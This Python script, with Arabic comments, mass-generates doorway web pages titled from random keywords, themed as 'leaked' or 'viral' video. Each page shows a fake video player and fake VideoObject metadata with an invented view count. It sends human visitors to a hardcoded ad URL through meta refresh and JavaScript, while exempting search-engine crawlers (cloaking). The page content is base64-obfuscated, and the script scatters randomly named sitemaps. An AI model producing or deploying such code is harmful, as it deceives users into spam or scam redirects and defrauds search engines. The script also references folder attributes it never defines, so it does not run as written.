import os
import random
import string
import re
from datetime import datetime
import base64

class UltraAggressiveSEO:
    def __init__(self):
        # مجلدات رئيسية عشوائية (اختار منها 6 كل مرة)
        self.main_folders_pool = [
            "news", "vid", "clips", "hot", "live", "viral", "update", "stream", "media", "watch", "play", "top"
        ]
        
        # مجلدات فرعية (داخل كل رئيسي)
        self.subfolders_pool = ["hbcm", "video", "leaked", "viral", "live", "trending", "exclusive", "hd"]
        
        self.domain = self._get_domain()
        self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"
       
        self.keywords_ar = self._load_keywords("keywords_ar.txt")
        self.keywords_en = self._load_keywords("keywords_en.txt")
        self.keywords_in = self._load_keywords("keywords_in.txt")
        
        self.movie_template = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>{{TITLE}}</title>
    <meta name="description" content="{{DESCRIPTION}}" />
   
    <!-- Open Graph -->
    <meta property="og:title" content="{{TITLE}}" />
    <meta property="og:description" content="{{DESCRIPTION}}" />
    <meta property="og:type" content="video.other" />
   
    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-EX63T35D79"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-EX63T35D79');
    </script>
   
    <!-- Video Schema -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "VideoObject",
      "name": "{{TITLE}}",
      "description": "{{DESCRIPTION}}",
      "uploadDate": "{{TIME_ISO}}",
      "duration": "PT10M30S",
      "embedUrl": "{{CANONICAL_URL}}",
      "interactionStatistic": {
        "@type": "InteractionCounter",
        "interactionType": { "@type": "WatchAction" },
        "userInteractionCount": 56420
      }
    }
    </script>
    <meta http-equiv="refresh" content="2; url={{REDIRECT_URL}}" />
    <style>
        :root {
            --primary: #e50914;
            --bg: #000;
            --text: #fff;
            --muted: #ccc;
        }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
            direction: rtl;
            line-height: 1.6;
        }
        .container {
            max-width: 1100px;
            margin: 40px auto;
            padding: 20px;
        }
        h1 {
            font-size: 2.8em;
            margin-bottom: 30px;
            color: var(--primary);
        }
        .player {
            position: relative;
            width: 100%;
            max-width: 900px;
            margin: 0 auto 35px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            height: 500px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        .play-icon {
            font-size: 140px;
            color: var(--primary);
            opacity: 0.9;
        }
        .watch-btn {
            background: var(--primary);
            color: #fff;
            padding: 18px 50px;
            font-size: 24px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 25px 0;
        }
        .watch-btn:hover {
            background: #c00;
        }
        .desc {
            font-size: 18px;
            color: var(--muted);
            max-width: 800px;
            margin: 0 auto;
        }
        .related {
            margin-top: 50px;
            text-align: right;
        }
        .related h3 {
            color: var(--primary);
            font-size: 1.6em;
            margin-bottom: 15px;
        }
        .related a {
            color: #fff;
            text-decoration: none;
            display: block;
            margin: 8px 0;
            font-size: 1.1em;
        }
        .related a:hover {
            color: var(--primary);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>{{TITLE}}</h1>
       
        <div class="player" onclick="playVideo()">
            <div class="play-icon">▶</div>
        </div>
       
        <a href="{{REDIRECT_URL}}" class="watch-btn">شاهد الآن بجودة عالية</a>
       
        <div class="desc">{{DESCRIPTION}}</div>
       
        <div class="related">
            <h3>فيديوهات مقترحة</h3>
            {{INTERNAL_LINKS}}
        </div>
    </div>
    <script>
        function playVideo() {
            if (!navigator.userAgent.match(/bot|crawl|spider|Googlebot|Bingbot|YandexBot/i)) {
                window.location = "{{REDIRECT_URL}}";
            }
        }
        setTimeout(() => {
            if (!navigator.userAgent.match(/bot|crawl|spider|Googlebot|Bingbot|YandexBot/i)) {
                window.location = "{{REDIRECT_URL}}";
            }
        }, 1500);
    </script>
</body>
</html>"""

    def _load_keywords(self, filename):
        if os.path.exists(filename):
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip()]
            except:
                return []
        return []

    def _get_domain(self):
        if os.path.exists("CNAME"):
            with open("CNAME", "r", encoding="utf-8") as f:
                return f.read().strip()
        return "static.meiguodizhi.com"

    def generate_title_and_desc(self):
        lang = random.choice(["ar", "en", "in"])
        keywords = getattr(self, f"keywords_{lang}", [])
        if not keywords:
            return "فيديو حصري جديد", "شاهد الآن بجودة عالية HD"
       
        words_count = random.randint(5, 12)
        selected = random.sample(keywords, min(len(keywords), words_count))
        title = ' '.join(selected)
       
        description = f"شاهد {title} الآن بجودة HD حصريًا بدون إعلانات"
       
        return title, description

    def clean_slug(self, title):
        clean = re.sub(r'[^a-zA-Z0-9\s\u0600-\u06FF\u0900-\u097F-]', '', title).lower()
        slug_parts = re.sub(r'[\s-]+', '-', clean).strip('-').split('-')
        # نأخذ أول 8 كلمات فقط (بدون hash عشوائي في النهاية)
        short_slug = '-'.join(slug_parts[:8])
        # لو الـ slug قصير جدًا، نضيف كلمة إضافية من العنوان عشان ما يبقاش فارغ
        if len(short_slug) < 10:
            extra = slug_parts[-1] if slug_parts else "video"
            short_slug = f"{short_slug}-{extra}"
        return f"{short_slug}.html"

    def create_multiple_sitemaps(self, pages):
        random.shuffle(pages)
        chunk_size = 50
        for i in range(0, len(pages), chunk_size):
            chunk = pages[i:i + chunk_size]
            random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            sitemap_name = f"sitemap_{random_name}.xml"
           
            sitemap_content = '<?xml version="1.0" encoding="UTF-8"?>\n'
            sitemap_content += '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
            for p in chunk:
                sitemap_content += f'  <url>\n    <loc>{p["url"]}</loc>\n    <lastmod>{datetime.utcnow().strftime("%Y-%m-%d")}</lastmod>\n    <changefreq>daily</changefreq>\n    <priority>0.8</priority>\n  </url>\n'
            sitemap_content += '</urlset>'
           
            with open(sitemap_name, "w", encoding="utf-8") as f:
                f.write(sitemap_content)
           
            print(f"Created sitemap: {sitemap_name} with {len(chunk)} URLs")

        print("All sitemaps created. No index file or robots.txt generated.")

    def run(self, count=200):
        if not os.path.exists(self.main_folder):
            os.makedirs(self.main_folder)
       
        target_sub = random.choice(self.subfolders)
        path = os.path.join(self.main_folder, target_sub)
        if not os.path.exists(path):
            os.makedirs(path)
       
        pages = []
       
        print(f"Generating {count} pages in {target_sub}...")
       
        for _ in range(count):
            title, description = self.generate_title_and_desc()
            slug = self.clean_slug(title)
            pages.append({
                "title": title,
                "description": description,
                "slug": slug,
                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}"
            })
       
        current_time_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")
       
        for p in pages:
            internal_sample = random.sample(pages, min(15, len(pages)))
            internal = "".join([f'<a href="{x["url"]}">{x["title"]}</a><br>' for x in internal_sample if x["url"] != p["url"]])
           
            final_html = self.movie_template.replace("{{TITLE}}", p['title'])\
                                           .replace("{{DESCRIPTION}}", p['description'])\
                                           .replace("{{CANONICAL_URL}}", p['url'])\
                                           .replace("{{REDIRECT_URL}}", self.redirect_url)\
                                           .replace("{{TIME_ISO}}", current_time_iso)\
                                           .replace("{{INTERNAL_LINKS}}", internal)
           
            encoded_html = base64.b64encode(final_html.encode('utf-8')).decode('utf-8')
           
            output_content = f"""<html><head><meta http-equiv="refresh" content="2; url={self.redirect_url}"></head><body><script>document.write(atob("{encoded_html}"));</script></body></html>"""
           
            with open(os.path.join(path, p['slug']), "w", encoding="utf-8") as f:
                f.write(output_content)
       
        self.create_multiple_sitemaps(pages)
       
        print(f"Done. Generated {count} pages in {target_sub}")

if __name__ == "__main__":
    bot = UltraAggressiveSEO()
    bot.run(count=50)
